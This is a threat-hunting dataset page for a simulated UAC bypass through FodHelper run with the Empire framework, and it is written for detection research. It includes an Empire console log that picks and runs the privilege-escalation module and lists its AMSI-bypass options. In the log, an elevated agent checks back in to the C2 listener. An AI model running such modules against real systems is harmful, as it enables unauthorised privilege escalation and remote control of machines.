# Empire UAC Shell API FodHelper

## Metadata


|                       |    |
|:----------------------|:---|
| id                    | SDWIN-200904032946 |
| author                | Roberto Rodriguez @Cyb3rWard0g |
| creation date         | 2020/09/04 |
| platform              | Windows |
| Tactic(s)             | ['[TA0004](https://attack.mitre.org/tactics/TA0004)'] |
| Technique(s)          | ['[T1548.002](https://attack.mitre.org/techniques/T1548/002)'] |
| Simulaton Environment | Mordor shire |
| Simulation Scripts    | ['https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/privesc/Invoke-FodHelperBypass.ps1'] |
| Dataset           | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/privilege_escalation/empire_uac_shellapi_fodhelper.zip |
| References        | ['https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/'] |

## Dataset Description
This dataset represents adversaries elevating privileges (bypassing uac) by performing an registry modification for FodHelper.

## Adversary View
```
(Empire: SP7B3U2X) > agents

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
KU86XWEL ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         5376   5/0.0    2020-09-04 07:07:17  http            
SP7B3U2X ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         1376   5/0.0    2020-09-04 07:12:15  http            

(Empire: agents) > interact SP7B3U2X
(Empire: SP7B3U2X) > 
(Empire: SP7B3U2X) > usemodule privesc/
ask                          bypassuac_sdctlbypass        mcafee_sitelist              powerup/service_exe_restore  powerup/write_dllhijacker
bypassuac                    bypassuac_tokenmanipulation  ms16-032                     powerup/service_exe_stager   printdemon
bypassuac_env                bypassuac_wscript            ms16-135                     powerup/service_exe_useradd  sherlock
bypassuac_eventvwr           getsystem*                   powerup/allchecks            powerup/service_stager       tater
bypassuac_fodhelper          gpp                          powerup/find_dllhijack       powerup/service_useradd      
(Empire: SP7B3U2X) > usemodule privesc/bypassuac_fodhelper
(Empire: powershell/privesc/bypassuac_fodhelper) > info

              Name: Invoke-FodHelperBypass
            Module: powershell/privesc/bypassuac_fodhelper
        NeedsAdmin: False
        OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: True
  OutputExtension: None

Authors:
  Petr Medonos

Description:
  Bypasses UAC by performing an registry modification for
  FodHelper (based
  onhttps://winscripting.blog/2017/05/12/first-entry-welcome-
  and-uac-bypass/)

Comments:
  https://winscripting.blog/2017/05/12/first-entry-welcome-
  and-uac-bypass/

Options:

  Name             Required    Value                     Description
  ----             --------    -------                   -----------
  Agent            True        SP7B3U2X                  Agent to run module on.                 
  Listener         True                                  Listener to use.                        
  Obfuscate        False       False                     Switch. Obfuscate the launcher          
                                                        powershell code, uses the               
                                                        ObfuscateCommand for obfuscation types. 
                                                        For powershell only.                    
  ObfuscateCommand False       Token\All\1               The Invoke-Obfuscation command to use.  
                                                        Only used if Obfuscate switch is True.  
                                                        For powershell only.                    
  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in 
                                                        the stager code.                        
  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   
                                                        the stager code.                        
  UserAgent        False       default                   User-agent string to use for the staging
                                                        request (default, none, or other).      
  Proxy            False       default                   Proxy to use for request (default, none,
                                                        or other).                              
  ProxyCreds       False       default                   Proxy credentials                       
                                                        ([domain\]username:password) to use for 
                                                        request (default, none, or other).      

(Empire: powershell/privesc/bypassuac_fodhelper) > set Listener http
(Empire: powershell/privesc/bypassuac_fodhelper) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked SP7B3U2X to run TASK_CMD_JOB
[*] Agent SP7B3U2X tasked with task ID 2
[*] Tasked agent SP7B3U2X to run module powershell/privesc/bypassuac_fodhelper
(Empire: powershell/privesc/bypassuac_fodhelper) > 
Job started: EHNK23

[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5
[*] New agent F2X6GE4R checked in
[+] Initial agent F2X6GE4R from 172.18.39.5 now active (Slack)
[*] Sending agent (stage 2) to F2X6GE4R at 172.18.39.5

(Empire: powershell/privesc/bypassuac_fodhelper) > agents

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
KU86XWEL ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         5376   5/0.0    2020-09-04 07:07:17  http            
SP7B3U2X ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         1376   5/0.0    2020-09-04 07:30:33  http            
F2X6GE4R ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         3936   5/0.0    2020-09-04 07:30:34  http            


(Empire: agents) > interact F2X6GE4R
(Empire: F2X6GE4R) > shell whoami
[*] Tasked F2X6GE4R to run TASK_SHELL
[*] Agent F2X6GE4R tasked with task ID 1
(Empire: F2X6GE4R) > 
theshire\pgustavo
..Command execution
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/privilege_escalation/empire_uac_shellapi_fodhelper.zip"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        